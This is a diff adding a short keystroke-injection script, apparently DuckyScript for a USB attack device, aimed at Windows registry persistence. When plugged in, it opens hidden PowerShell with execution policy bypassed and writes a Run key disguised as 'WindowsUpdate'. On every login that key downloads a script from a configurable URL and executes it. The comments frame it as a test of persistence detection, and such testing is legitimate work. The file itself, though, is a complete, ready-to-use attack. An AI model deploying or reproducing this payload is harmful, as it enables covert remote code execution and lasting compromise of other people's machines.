@@ -1,0 +1,19 @@
+REM ============================================================
+REM  Windows · Registry Persistence (Run Key)
+REM ============================================================
+REM  Creates a Run registry key that launches a PowerShell payload
+REM  on every user login. For testing persistence detection.
+REM
+REM  Set PAYLOAD_URL to your hosted script.
+REM  Clean up: Remove-ItemProperty HKCU:\...\Run -Name "WindowsUpdate"
+
+DEFAULTDELAY 60
+
+DEFINE PAYLOAD_URL http://192.168.1.100:8080/update.ps1
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN $cmd='powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''PAYLOAD_URL'')"';Set-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value $cmd;exit
